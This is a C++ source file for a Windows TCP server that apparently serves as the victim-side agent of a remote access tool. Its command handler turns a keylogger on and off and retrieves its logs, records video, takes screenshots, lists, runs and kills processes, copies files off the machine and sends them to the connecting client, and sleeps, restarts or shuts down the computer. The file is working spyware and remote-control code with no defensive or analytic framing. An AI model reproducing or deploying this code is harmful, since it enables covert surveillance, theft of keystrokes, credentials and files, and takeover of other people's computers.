#include "server.h"
#include <sstream>

Server::Server()
{
}

void Server::Init()
{
    keylog.keyloggerON = true;
    keylog.keyloggerRunning = false;
    keylog.path = "";
    keyLogThread = std::thread(&keylogger::Keylogger, &keylog);
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    {
        std::cerr << "WSAStartup failed\n";
        exit(1);
    }

    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;
    hints.ai_flags = AI_PASSIVE;

    if (getaddrinfo(nullptr, PORT, &hints, &res) != 0)
    {
        std::cerr << "Get address info failed\n";
        WSACleanup();
        exit(1);
    }

    listenSock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (listenSock == INVALID_SOCKET)
    {
        std::cerr << "Create listen socket failed\n";
        freeaddrinfo(res);
        WSACleanup();
        exit(1);
    }
    if (bind(listenSock, res->ai_addr, (int)res->ai_addrlen) == SOCKET_ERROR)
    {
        std::cerr << "Bind failed\n";
        freeaddrinfo(res);
        closesocket(listenSock);
        WSACleanup();
        exit(1);
    }
    freeaddrinfo(res);

    if (listen(listenSock, SOMAXCONN) == SOCKET_ERROR)
    {
        std::cerr << "Listen failed\n";
        closesocket(listenSock);
        WSACleanup();
        exit(1);
    }
}

bool Server::WaitForConnection()
{
    clientSock = accept(listenSock, nullptr, nullptr);
    if (clientSock == INVALID_SOCKET)
    {
        std::cerr << "Accept failed with error: " << WSAGetLastError() << std::endl;
        return false;
    }
    return true;
}

bool Server::GetCommandFromClient()
{
    int lenght = recv(clientSock, command, BUFSIZE, 0);
    if (lenght > 0)
    {
        ProcessCommand();
        return 1;
    }
    else
        return 0;
}

void Server::ProcessCommand()
{
    std::stringstream ss(command);
    std::string com, body;
    ss >> com;
    std::getline(ss, body);
    if(!body.empty())body=body.substr(1);
    if (com == "COPYFILE")
    {
        std::string destPath = CopyToPath(body);
        SendResult(destPath);
        DeleteFilePath(body);
        DeleteFilePath(destPath);
    }
    else if (com == "TOGGLE_VIDEO")
    {
        if (isRecording())
        {
            stopRecording();
        }
        else
        {
            startRecording(videoFilePath);
        }
    }
    else if (com == "GET_VIDEO")
    {
        if (isRecording())
        {
            stopRecording();
        }
        if (!videoFilePath.empty())
            SendResult(videoFilePath);
    }
    else if (com == "TOGGLE_KEYLOGGER")
    {
        std::lock_guard<std::mutex> lock(keylog.mtx);
        keylog.keyloggerRunning = !keylog.keyloggerRunning;
        if (keylog.keyloggerRunning)
        {
            keylog.path = "../data/keylogger/" + keylog.generate_random_string(10) + ".txt";
        }
    }
    else if (com == "GET_KEYLOGGER")
    {
        std::string path_to_send;
        {
            std::lock_guard<std::mutex> lock(keylog.mtx);
            if (!keylog.path.empty())
            {
                keylog.keyloggerRunning = false;
                path_to_send = keylog.path;
                keylog.path = "";
            }
        }
        if (!path_to_send.empty())
        {
            SendResult(path_to_send);
        }
    }
    else if(com=="TAKE_SCREEN_SHOT")
    {
        takeScreenShot();
        SendResult("../data/screenshot/screenshot.png");
    }
    else if (com == "GET_RUNNING_PROCESS")
    {
       listProcesses();
       SendResult("../data/process/running_process.txt");
    }
    else if (com == "RUN_PROCESS")
    {
        std::wstring name(body.begin(), body.end());
        name = L"\"" + name + L"\"";
        startProcess(name);
    }
    else if (com == "SHUTDOWN_PROCESS")
    {
        std::wstring name(body.begin(), body.end());
        stopProcess(name);
    }
    else if (com == "SLEEP")
    {
        Sleep();
    }
    else if (com == "RESTART")
    {
        Restart();
    }
    else if (com == "SHUTDOWN")
    {
        ShutDown();
    }
    for (int i = 0; i < BUFSIZ; i++)
    {
        command[i] = '\0';
    }
}

void Server::SendResult(const std::string path)
{
    std::ifstream file(path, std::ios::binary | std::ios::ate);
    if (!file.is_open())
    {
        std::cerr << "ERROR: Could not open file: " << path << std::endl;
        std::string error_msg = "ERROR:File not found\n";
        send(clientSock, error_msg.c_str(), error_msg.length(), 0);
        return;
    }

    std::streamsize file_size = file.tellg();
    file.seekg(0, std::ios::beg);

    fs::path full_path(path);
    std::string filename_only = full_path.filename().string();
    std::string path_header = "PATH:" + filename_only + "\n";
    std::string size_header = "SIZE:" + std::to_string(file_size) + "\n";

    send(clientSock, path_header.c_str(), path_header.length(), 0);
    send(clientSock, size_header.c_str(), size_header.length(), 0);

    std::cout << "Sending file " << path << " (" << file_size << " bytes)\n";
    std::vector<char> buffer(8192); // 8KB buffer
    while (file.read(buffer.data(), buffer.size()))
    {
        if (send(clientSock, buffer.data(), buffer.size(), 0) < 0)
        {
            std::cerr << "Failed to send file chunk.\n";
            file.close();
            return;
        }
    }

    if (file.gcount() > 0)
    {
        send(clientSock, buffer.data(), file.gcount(), 0);
    }

    file.close();
    std::cout << "File transfer complete.\n";
}

void Server::DisconnectClient()
{
    if (clientSock == INVALID_SOCKET)
        return;
    closesocket(clientSock);
    clientSock = INVALID_SOCKET;
}

void Server::Shutdown()
{
    if (clientSock != INVALID_SOCKET)
    {
        shutdown(clientSock, SD_SEND);
        closesocket(clientSock);
        clientSock = INVALID_SOCKET;
    }
    if (listenSock != INVALID_SOCKET)
    {
        closesocket(listenSock);
        listenSock = INVALID_SOCKET;
    }

    keylog.keyloggerON = false;
    if (keyLogThread.joinable())
    {
        keyLogThread.join();
    }

    WSACleanup();
}